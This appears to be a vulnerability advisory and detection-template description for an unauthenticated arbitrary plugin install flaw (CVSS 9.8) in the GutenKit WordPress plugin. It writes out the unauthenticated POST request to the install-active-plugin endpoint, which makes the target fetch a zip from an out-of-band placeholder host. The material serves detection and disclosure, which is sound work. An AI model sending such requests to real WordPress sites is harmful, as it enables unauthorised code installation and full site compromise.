## Vulnerability
The GutenKit Page Builder Blocks, Patterns, and Templates for Gutenberg Block Editor plugin for WordPress is vulnerable to arbitrary file upload due to a missing capability check on the `install_and_activate_plugin_from_external()` function (install-active-plugin REST API endpoint) in all versions up to, and including, 2.1.0. Unauthenticated attackers can install and activate arbitrary plugins or upload arbitrary files spoofed as plugins, resulting in remote code execution and complete WordPress site compromise.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 9.8), CWE-862.

## PoC / Detection
Classification: rce

The template first issues a GET request to `/` and matches `contains(body, "/wp-content/plugins/gutenkit-blocks-addon") && status_code == 200` to fingerprint the installed GutenKit plugin. It then issues a POST request to `/wp-json/gutenkit/v1/install-active-plugin` with the form body `plugin=http://{{interactsh-url}}/{{rand_text_alpha(12)}}.zip`. Detection succeeds on a 200 JSON response containing both `"Failed to unzip plugin"` and `"success\":false"`, confirming the endpoint is exposed, processes unauthenticated external-plugin install requests, and attempts the OOB fetch.
